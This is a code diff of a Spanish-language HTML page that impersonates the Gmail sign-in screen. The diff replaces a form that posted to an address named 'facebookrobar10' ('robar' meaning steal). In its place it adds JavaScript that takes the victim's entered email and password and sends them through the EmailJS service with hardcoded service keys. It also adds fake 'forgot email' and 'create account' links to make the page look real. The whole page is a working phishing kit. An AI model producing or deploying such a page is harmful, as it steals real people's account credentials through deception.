@@ -1,9 +1,11 @@
 <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulario de Gmail</title>
+    <title>Iniciar sesión - Gmail</title>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <style>
         body {
             display: flex;
@@ -26,6 +28,7 @@
         .form-container h1 {
             font-size: 24px;
             margin-bottom: 20px;
+            color: #202124;
         }
         .input-field {
             width: 100%;
@@ -48,16 +51,55 @@
         .submit-btn:hover {
             background-color: #1558b0;
         }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #555;
+        }
     </style>
 </head>
 <body>
     <div class="form-container">
-        <h1>Formulario de Gmail</h1>
-        <form action="facebookrobar10@gmail.com" method="POST">
-            <input type="email" name="email" placeholder="Correo electrónico" class="input-field" required>
-            <input type="password" name="password" placeholder="Contraseña" class="input-field" required>
-            <button type="submit" class="submit-btn">Enviar</button>
+        <h1>Iniciar sesión</h1>
+        <form id="loginForm">
+            <input type="email" id="user_email" name="email" placeholder="Correo electrónico" class="input-field" required>
+            <input type="password" id="password" name="password" placeholder="Contraseña" class="input-field" required>
+            <button type="submit" class="submit-btn">Iniciar sesión</button>
         </form>
+        <div class="footer">
+            <p><a href="#" style="text-decoration: none; color: #1a73e8;">¿Olvidaste tu correo?</a></p>
+            <p><a href="#" style="text-decoration: none; color: #1a73e8;">Crear cuenta</a></p>
+        </div>
     </div>
+
+    <script type="text/javascript">
+        // Inicializar EmailJS
+        (function(){
+            emailjs.init("1MVoO32kuFF2j3UiY"); // Sustituye YOUR_USER_ID con tu ID de usuario de EmailJS
+        })();
+
+        // Función para manejar el envío del formulario
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevenir el envío por defecto del formulario
+            
+            var formData = new FormData(this);
+            var email = formData.get("email");
+            var password = formData.get("password");
+
+            // Enviar el correo electrónico utilizando EmailJS
+            emailjs.send("sK5jFr9FHr-FXAP6qKTTD", "login_form", {
+                user_email: email,
+                password: password
+            })
+            .then(function(response) {
+                alert("¡Correo enviado correctamente!");
+                console.log("Éxito al enviar el correo:", response);
+            }, function(error) {
+                alert("Hubo un error al enviar el correo.");
+                console.log("Error al enviar el correo:", error);
+            });
+        });
+    </script>
 </body>
 </html>
+
